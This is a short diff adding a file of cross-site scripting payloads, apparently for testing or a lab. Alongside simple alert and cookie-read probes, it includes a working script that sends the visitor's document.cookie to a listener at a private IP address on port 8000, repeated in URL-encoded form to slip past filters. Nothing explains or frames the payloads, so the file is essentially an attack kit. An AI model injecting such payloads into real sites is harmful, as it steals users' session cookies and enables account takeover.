@@ -1,0 +1,10 @@
+
+<h1>hello</h1>
+<i>hi</i>
+
+<script>alert(1);</script>
+<script>document.cookie;</script>
+
+<script>img = new Image(); img.src="http://192.168.1.106:8000/?" + document.cookie; document.body.appendChild(img); </script>
+
+%3cscript%3eimg%20%3d%20new%20Image%28%29%3b%20img%2esrc%3d%22http%3a%2f%2f192%2e168%2e1%2e106%3a8000%2f%3f%22%20%2b%20document%2ecookie%3b%20document%2ebody%2eappendChild%28img%29%3b%20%3c%2fscript%3e
